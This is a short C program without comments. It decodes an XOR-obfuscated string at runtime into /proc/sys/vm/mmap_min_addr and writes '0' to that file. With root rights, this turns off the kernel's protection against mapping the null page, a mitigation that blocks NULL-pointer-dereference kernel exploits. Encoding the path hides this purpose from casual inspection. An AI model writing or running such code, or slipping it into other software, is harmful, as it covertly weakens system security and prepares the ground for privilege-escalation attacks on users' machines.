#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void decode(char *ptr, size_t size)
{
  size_t i;
  
  for (i = 0; i < size; i++) {
    ptr[i] ^= 0x65;
  }
}

int main(void)
{
  int fd;
  char enc_path[27] = {0x4A, 0x15, 0x17, 0x0A, 0x06, 0x4A, 0x16, 0x1C, 0x16, 0x4A, 0x13, 0x08, 0x4A, 0x08, 0x08, 0x04, 0x15, 0x3A, 0x08, 0x0C, 0x0B, 0x3A, 0x04, 0x01, 0x01, 0x17, 0x65};
  char path[27];
  
  memcpy(path, enc_path, 27);
  decode(path, 27);
  
  fd = open(path, O_WRONLY);
  write(fd, "0", 1);
  close(fd);
  
  return 0;
}
